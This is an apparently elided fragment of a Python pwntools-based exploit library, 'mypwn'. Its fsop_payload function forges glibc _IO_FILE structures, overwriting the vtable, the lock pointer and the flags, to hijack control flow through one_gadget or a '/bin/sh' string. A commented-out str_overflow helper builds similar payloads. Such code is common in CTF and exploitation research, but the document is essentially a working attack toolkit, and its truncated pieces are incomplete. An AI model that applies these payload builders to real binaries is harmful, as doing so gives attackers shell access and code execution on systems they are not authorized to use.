...
from mypwn.mypwnlib.iofile.iofile_struct import *
# def pack32_num(num):
#     return p32(num)
...
file_plus=_IO_FILE_plus_size[context.arch]

# def str_overflow(one_gadget,vtable_ptr):
#     plus_value=file_plus.values()
#     plus_keys=file_plus.keys()
#     flags_offset=plus_keys[plus_value.index('_flags')]
#     write_ptr_offset=plus_keys[plus_value.index('_IO_write_ptr')]
#     vtable_ptr_offset=plus_keys[plus_value.index('vtable')]
#     payload=''
#     if context.arch=='amd64':
#         payload+=p64(0)
#         payload=payload.ljust(write_ptr_offset,'\x00')+'\xff'*8
#         payload
...
def fsop_payload(iofile_addr,writes,addr_payload={},lock_ptr=0x0,use_onegadget=0,vtable_ptr=0,sh_str='/bin/sh\x00'):
    """
        fsop_payload(iofile_addr,writes,addr_payload={},lock_ptr=0x0,use_onegadget=0,sh_str='/bin/sh\x00')
    """
    mode_bit=4
    if context.arch=='amd64':
        mode_bit=8
    ...
    if vtable_ptr_idx not in idx_can_not_use_list and lock_ptr_idx not in idx_can_not_use_list:
        ...
        if vtable_offset_idx not in idx_can_not_use_list:
            idx_can_not_use_list.append(vtable_offset_idx)       # avoid
        else:
            myprint("***************************")
            myprint("tips: it mays use old vtable, in term of i386!")
    else:
        myprint('*****************************')
            ...
            if (flags & 0x8)==0 and (flags & 0x800)!=0:
                ...
                # flags2 in idx_be_change and may be in idx_can_not_use_list
                    ...
                    if (flags2 &  32)==0:
                        ...
                        myprint("*********************************")
                        myprint("Attention: must use onegadget!, please set arg use_onegadget=1")
                        if use_onegadget==0:
                            quit()
                        funcptr_idx=finish_idx
                # flags2 be zero             
